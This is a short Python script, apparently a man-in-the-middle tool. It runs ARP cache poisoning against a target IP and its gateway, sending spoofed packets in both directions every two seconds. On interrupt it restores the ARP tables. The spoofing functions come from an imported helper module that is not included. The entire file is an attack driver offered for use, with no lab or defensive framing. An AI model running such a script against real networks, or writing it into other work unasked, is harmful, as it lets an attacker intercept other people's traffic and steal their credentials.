from mitm_helper_func import spoof, restore
import argparse
import time

def main():
	parser = argparse.ArgumentParser()
	parser.add_argument('-t', '--target', help="Target IP")
	parser.add_argument('-g', '--gateway', help="Gateway IP")
	args = parser.parse_args()

	target = args.target
	gateway = args.gateway

	try:
		number_of_packets = 0
		while True:
			spoof(gateway, target)
			spoof(target, gateway)
			time.sleep(2)
			number_of_packets += 2
			print(f"\rSent {number_of_packets} packets", end="")
	except KeyboardInterrupt:
		print("\nRestoring ARP Tables...")
		restore(gateway, target)
		restore(target, gateway)

if __name__ == '__main__':
	main()
